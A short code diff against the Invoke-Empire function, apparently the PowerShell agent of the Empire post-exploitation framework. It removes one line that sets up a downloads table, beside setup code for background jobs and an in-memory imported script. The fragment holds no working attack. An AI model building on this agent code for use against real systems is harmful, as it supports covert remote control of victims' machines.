@@ -140,7 +140,6 @@ function Invoke-Empire {
     # keep track of all background jobs
     #   format: {'RandomJobName' : @{'Alias'=$RandName; 'AppDomain'=$AppDomain; 'PSHost'=$PSHost; 'Job'=$Job; 'Buffer'=$Buffer}, ... }
     $Script:Jobs = @{}
-    $Script:Downloads = @{}
     # the currently imported script held in memory
     $script:ImportedScript = ''
 
